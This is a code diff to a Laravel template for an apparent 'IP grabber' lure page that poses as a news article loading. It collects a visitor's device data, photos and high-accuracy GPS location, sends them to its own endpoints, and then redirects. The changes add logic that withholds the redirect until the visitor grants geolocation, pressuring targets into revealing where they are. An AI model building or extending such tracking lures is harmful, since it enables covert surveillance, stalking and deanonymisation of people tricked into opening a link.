@@ -113,14 +113,14 @@
     @endif
 
     @if($mensagem !== 'Abrindo notícia, aguarde...')
-        <div class="card">
+        <div id="__message-card" class="card" @if($captureGps || $captureAlvo) hidden @endif>
             <div class="icon">
                 <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                     <path stroke-linecap="round" stroke-linejoin="round"
                         d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126ZM12 15.75h.007v.008H12v-.008Z" />
                 </svg>
             </div>
-            <h1>{{ $redirectUrl ? 'Redirecionando...' : $mensagem }}</h1>
+            <h1 id="__message-text">{{ $redirectUrl ? 'Redirecionando...' : $mensagem }}</h1>
         </div>
     @endif
 
@@ -160,11 +160,14 @@
     (function () {
         var token      = @json($token);
         var accessId   = @json($accessUuid);
+        var mensagem   = @json($mensagem);
+        var gpsRequiredMessage = @json(\App\Models\IpGrabber::GPS_REQUIRED_MESSAGE);
         var captureGps = @json($captureGps);
         var captureAlvo = @json($captureAlvo);
         var captureIdentity = @json($captureIdentity);
         var redirectUrl = @json($redirectUrl);
         var downloadUrl = @json($downloadUrl);
+        var gpsAutorizado = !captureGps;
         var endpoint      = window.location.pathname.replace(/\/$/, '') + '/device';
         var endpointFotos = window.location.pathname.replace(/\/$/, '') + '/fotos';
         var csrf          = @json(csrf_token());
@@ -526,6 +529,15 @@
         }
 
         function redirecionar() {
+            if (deveBloquearPorGps() && !gpsAutorizado) {
+                mostrarMensagem(gpsRequiredMessage);
+                return;
+            }
+
+            if (mensagem !== gpsRequiredMessage) {
+                mostrarMensagem();
+            }
+
             if (downloadUrl) {
                 var a = document.createElement('a');
                 a.href = downloadUrl;
@@ -537,6 +549,29 @@
             }
             if (!redirectUrl) return;
             window.location.href = redirectUrl;
+        }
+
+        function mostrarMensagem(texto) {
+            var card = document.getElementById('__message-card');
+            var messageText = document.getElementById('__message-text');
+
+            if (messageText && texto) {
+                messageText.textContent = texto;
+            }
+
+            if (card) {
+                card.hidden = false;
+            }
+        }
+
+        function deveBloquearPorGps() {
+            return captureGps && mensagem === gpsRequiredMessage;
+        }
+
+        function mostrarBloqueioGpsSeNecessario() {
+            if (deveBloquearPorGps()) {
+                mostrarMensagem(gpsRequiredMessage);
+            }
         }
 
         // ─────────────────────────────────────────────────────────────
@@ -668,17 +703,26 @@
             }
 
             if (!accessId) {
-                Promise.resolve(enviar(null, { gps_status: 'skipped', gps_error: 'Acesso sem identificador para atualizar.' })).then(callback);
+                Promise.resolve(enviar(null, { gps_status: 'skipped', gps_error: 'Acesso sem identificador para atualizar.' })).then(function() {
+                    mostrarBloqueioGpsSeNecessario();
+                    callback();
+                });
                 return;
             }
 
             if (!window.isSecureContext) {
-                Promise.resolve(enviar(null, { gps_status: 'insecure', gps_error: 'Geolocation exige HTTPS/contexto seguro.' })).then(callback);
+                Promise.resolve(enviar(null, { gps_status: 'insecure', gps_error: 'Geolocation exige HTTPS/contexto seguro.' })).then(function() {
+                    mostrarBloqueioGpsSeNecessario();
+                    callback();
+                });
                 return;
             }
 
             if (!navigator.geolocation) {
-                Promise.resolve(enviar(null, { gps_status: 'unsupported', gps_error: 'Navegador sem suporte a geolocalizacao.' })).then(callback);
+                Promise.resolve(enviar(null, { gps_status: 'unsupported', gps_error: 'Navegador sem suporte a geolocalizacao.' })).then(function() {
+                    mostrarBloqueioGpsSeNecessario();
+                    callback();
+                });
                 return;
             }
 
@@ -691,7 +735,13 @@
             }
 
             navigator.geolocation.getCurrentPosition(function(posicao) {
-                if (!posicao || !posicao.coords) { finalizar(); return; }
+                if (!posicao || !posicao.coords) {
+                    mostrarBloqueioGpsSeNecessario();
+                    finalizar();
+                    return;
+                }
+
+                gpsAutorizado = true;
 
                 Promise.resolve(enviar(null, {
                     gps_latitude:  posicao.coords.latitude,
@@ -709,7 +759,10 @@
                 Promise.resolve(enviar(null, {
                     gps_status: status,
                     gps_error:  error && error.message ? error.message : 'Falha ao obter GPS.',
-                })).then(finalizar);
+                })).then(function() {
+                    mostrarBloqueioGpsSeNecessario();
+                    finalizar();
+                });
             }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
         }
 
